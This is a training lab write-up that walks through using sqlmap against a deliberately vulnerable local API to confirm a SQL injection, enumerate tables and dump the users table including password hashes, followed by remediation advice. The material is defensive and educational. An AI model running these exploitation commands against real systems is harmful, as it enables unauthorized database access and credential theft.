# Lab: sqlmap Automation — SQL Injection at Scale

## Overview

| Field          | Details                                               |
|----------------|-------------------------------------------------------|
| **Objective**  | Use sqlmap to automate discovery and exploitation of the `users/search` SQL injection |
| **Difficulty** | ⭐⭐ Medium                                           |
| **Time**       | 40 minutes                                            |
| **Category**   | Injection / Tooling                                     |
| **OWASP**      | Injection (related to API8:2023 Security Misconfiguration via unsafe query building) |

---

## Prerequisites

- A running instance of **SocialHack API** at `http://localhost:5001`
- `sqlmap` installed (`pip install sqlmap`) — if unavailable, use the Python fallback in the solution script
- Completion of Lab 08 (SQL Injection via Search Endpoint) is recommended — this lab automates the same vulnerability

---

## Background

Lab 08 walked through manually exploiting the SQL injection in `GET /api/v1/users/search?q=`. Manual exploitation builds understanding, but real engagements (and CI-integrated security testing) benefit from automation. `sqlmap` can detect the injection point, fingerprint the database engine, and dump entire tables without hand-crafting each payload — as long as it's told how to authenticate to the endpoint first.

---

## Tasks

### Task 1: Get an Auth Token

**Steps:**
1. Log in as alice and capture the JWT

**Bash example:**
```bash
TOKEN=$(curl -s -X POST http://localhost:5001/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"password123"}' | python3 -c "import sys,json;print(json.load(sys.stdin)['token'])")
echo "$TOKEN"
```

---

### Task 2: Confirm the Injection Point with sqlmap

**Steps:**
1. Point sqlmap at the search endpoint with the token attached as a header

**sqlmap example:**
```bash
sqlmap -u "http://localhost:5001/api/v1/users/search?q=alice" \
  --headers="Authorization: Bearer $TOKEN" \
  --batch --level=3 --risk=2
```

**🚩 FLAG 1: Which parameter does sqlmap identify as injectable, and which technique(s) does it report as working?**

<details>
<summary>💡 Hint 1</summary>
sqlmap should report the "q" GET parameter as injectable, typically via UNION query-based and/or error-based technique against SQLite.
</details>

---

### Task 3: Enumerate Tables and Columns

**Steps:**
1. List tables, then list columns of the `users` table

**sqlmap example:**
```bash
sqlmap -u "http://localhost:5001/api/v1/users/search?q=alice" \
  --headers="Authorization: Bearer $TOKEN" --batch --tables

sqlmap -u "http://localhost:5001/api/v1/users/search?q=alice" \
  --headers="Authorization: Bearer $TOKEN" --batch -T users --columns
```

**🚩 FLAG 2: List the column names sqlmap discovers on the `users` table**

<details>
<summary>💡 Hint 1</summary>
Compare this to the columns actually returned by the search endpoint's SELECT statement (Stage 6.1) vs. the FULL set of columns in the underlying table — sqlmap can often find more than what a single query returns.
</details>

---

### Task 4: Dump the Full `users` Table

**Steps:**
1. Dump all rows/columns from `users`

**sqlmap example:**
```bash
sqlmap -u "http://localhost:5001/api/v1/users/search?q=alice" \
  --headers="Authorization: Bearer $TOKEN" --batch \
  -T users --dump
```

**🚩 FLAG 3: What is admin's `password_hash` value as dumped by sqlmap?**

<details>
<summary>💡 Hint 1</summary>
If this succeeds, sqlmap has dumped data that the search endpoint's own SELECT statement never explicitly requested (like `password_hash`) — that's the power (and danger) of full SQL injection.
</details>

---

### Task 5 (No sqlmap? Use the Python Fallback)

If sqlmap isn't available in your environment, run the solution script's Python fallback, which performs an equivalent manual UNION-based dump using the `requests` library.

**🚩 FLAG 4: Confirm the Python fallback and sqlmap (if available) return the same data**

---

## Flags to Find

| Flag   | Description                                                | Hint                                    |
|--------|--------------------------------------------------------------|--------------------------------------------|
| FLAG 1 | Injectable parameter + working technique(s)                  | sqlmap's detection summary                  |
| FLAG 2 | Column names on the `users` table                             | `sqlmap ... -T users --columns`             |
| FLAG 3 | admin's dumped `password_hash`                                | `sqlmap ... -T users --dump`                |
| FLAG 4 | Confirm fallback method matches sqlmap's results               | Compare both outputs                        |

---

## Remediation

### 1. Parameterized Queries (the real fix)
```python
result = db.session.execute(
    db.text("SELECT id, username FROM users WHERE username LIKE :q"),
    {"q": f"%{query}%"}
)
```

### 2. Use sqlmap as a Regression Test After Fixing
```bash
sqlmap -u "http://localhost:5001/api/v1/users/search?q=alice" \
  --headers="Authorization: Bearer $TOKEN" --batch
# Should report: "all tested parameters do not appear to be injectable"
```

### 3. Least-Privilege Database Accounts
- The application's DB user should not have permission to read `password_hash`/`api_key` columns it doesn't need for a given query, limiting blast radius even if injection occurs.

### 4. Web Application Firewall (WAF) as Defense-in-Depth
- A WAF can catch common sqlmap signatures, but should never be the *only* control — parameterized queries are the actual fix.

---

## References

- [sqlmap documentation](https://github.com/sqlmapproject/sqlmap/wiki)
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
